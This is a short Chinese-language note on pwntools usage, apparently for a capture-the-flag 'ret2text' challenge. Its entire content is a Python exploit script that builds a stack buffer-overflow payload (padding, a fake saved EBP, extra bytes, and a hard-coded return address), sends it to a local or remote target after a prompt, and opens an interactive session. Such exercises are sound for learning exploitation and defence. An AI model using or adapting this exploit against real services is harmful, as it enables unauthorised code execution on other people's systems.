## pwntools 使用

```python
from pwn import *

# p = process("./ret2test") # 加载本地文件
p = remote("", )

esp_padding = "junkjunk" # esp寻址的话需要多加上8字节
ebp_fake = "junk"
padding = "a" * 0x64
ret_addr = 0x0804863a
payload = padding + ebp_fake + esp_padding + p32(ret_addr)
p.sendlineafter("There is something amazing here, do you know anything?\n", payload)
p.interactive()
```

